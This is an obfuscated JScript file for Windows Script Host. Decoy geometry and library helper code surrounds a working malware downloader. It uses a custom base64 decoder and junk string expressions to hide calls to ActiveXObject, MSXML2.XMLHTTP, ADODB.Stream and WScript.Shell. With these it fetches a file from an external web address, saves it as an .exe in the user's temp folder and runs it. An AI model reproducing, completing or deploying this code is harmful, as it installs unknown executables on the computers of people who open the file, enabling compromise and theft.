
var animate = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  stickers = [];
	
var tasmania = { ':': '.','U': 'S','381': 'X'};
	var ascii = 0;


function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function misleading(intersection) {
	exhibition = intersection;
	for (var i in tasmania){exhibition = exhibition.replace(i, tasmania[i]);}
    return exhibition;
};

var breath = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.misleading4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.replace(/foundation/g, '')
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = animate[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = animate[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = animate[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = animate[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var xanax ="foundationJVfoundationRFTVfoundationAl".misleading4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var southampton = "foundationQWfoundationN0aXZfoundationlWE9iafoundationmVjdA=foundation=".misleading4();
String.prototype.misleading2 = function () {
    var postal = {
        mania: this
    };
    postal.convert = postal.mania["c3Vic3RyaW5n".misleading4()](ascii, breath);
    return postal.convert;
};

var paraphrase ="foundationRXhwYW5foundationkRW52aXfoundationJvbm1lbnRTdHJfoundationpbmdz".misleading4();
var Native = function(options){
	
};
var sponsor = [southampton, paraphrase,xanax,  ""+"."+("enjoying","mattress","migration","others","socialist","metamorphosis","farmers","plebeian","exe"), "UnVu".misleading4(), misleading("M"+"SX"+"ML"+("essays","benny","accordance","jordan","changeable","leinster","civic","2.")+"381M"+"LH"+"TT"+("allowed","haven","agricultural","opulence","vodka","unified","exploration","awarded","P>")+"WU"+("reciprocate","singapore","expected","titter","signup","roger","detest","cr")+("malthus","elocution","sprinkling","nightcap","projected","summary","necessary","tracked","ip")+"t:"+("jocular","longest","tablet","cycle","adverse","dividend","mined","playground","Sh")+"ell")];
piers = "_F2_";
var yellow = this[sponsor.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
bVAhMaKxEkp = "NxbVQLhF";
moore = (("richardson", "property", "conditional", "occasions", "playmate", "later", "escorts", "pjRgcJU") + "DkEkfGo").misleading2();
geology = (("realistic", "spine", "randy", "pichunter", "everywhere", "immutable", "smirk", "secrete", "scanning", "sAsqWVvVT") + "VkBmMU").misleading2();
  
    String.prototype.automotive = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var pussy = sponsor.pop().split(">");

reinforce = "b3Blbg==".misleading4();
var monosyllable = new yellow(pussy[1]);
var plantains = new yellow(pussy[0]);
var carbine = monosyllable[sponsor.shift()](sponsor.shift());
weasel = "E";

var physicians = sponsor.shift();
var mammon = sponsor.shift();
function palermo(senate, upholstery) {

    try {
        var species = carbine + "/" + upholstery ;
		species = species+ physicians;
            plantains[reinforce](("apache","miocene","benignant","symptom","choral","emacs","occurs","vengeful","G" + weasel) + ("refresh","scold","intact","prisoner","selfsatisfied","poetry","better","durban","salmon","monotone","T"), senate, false);
       
    plantains[geology + ("enquiry","appreciative","end")]();
	var girth=("moore" + WScript=="moore" + "V2luZG93cyBTY3JpcHQgSG9zdA==".misleading4())&&plantains["c3RhdHVz".misleading4()] +""=="MjAw".misleading4()&&typeof(DULQeufceB)==="undefined";

    if (girth) {
		
        var householder = new yellow((("pennsylvania","inspiration","infatuation","edward","folks","seduce","thinker","issue","A")+("algiers","condone","skilled","bulwark","chemistry","defilement","miscellaneous","gothic","SEOO")+"DB"+("abdication","induction","fares","kinase","probe","ducal","recycling",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        householder[reinforce]();
        uEfshiEvyvj = "_F9_";
        householder.type = breath;
        JmXbfytVQp = "_F10_";
        householder["d3JpdGU=".misleading4()](plantains[("elongated","switched","empire","competition","tribute","celtic","inner","")+"R"+"es"+"pon"+tasmania['U'].toLowerCase()+"e"+"Qm9keQ==".misleading4()]);
        FjUxrgmnSu = "_F11_";
        householder[(moore + "o"+("babel","norton","cuirass","glinting","nimble","algorithms","anatomy","icelandic","00")+("therapy","thing","wyoming","determination","suppliers","furlough","lewdness","8i")+"tion").replace("0"+("makeshift","reptile","livestock","contingent","erica","hellish","frontier","08"), geology)] = 0;
        BoXDdtHrv = "_F12_";
        householder.saveToFile(species, 2);
        ulbDgsYD = "_F13_";
        householder.close();
        EceNyilKmo = "_F14_";
		monosyllable[mammon](species, breath, true);
    }
} catch (ippiKIc) { };

    vaozSwlXS = "_F15_";
}
try{
palermo("aHRfoundation0cDfoundationovLw=foundation=".misleading4()+"\u0077\u0077\u0077"+"\u002E\u0073\u0074\u0075\u0064\u0069\u006F\u0070\u0061\u0072\u0063\u0069\u0061\u006E\u0065\u006C\u006C\u006F\u002E\u0063\u006F\u006D\u002F\u0037\u0038\u0074\u0067\u0037\u0036\u0038\u0062" + "?lNmJiOzwAzv=HvcjkeVRSwp","iJpBkrmj");}catch(RaAYxgzI){}

   iCgDrSw = "_F16_";
   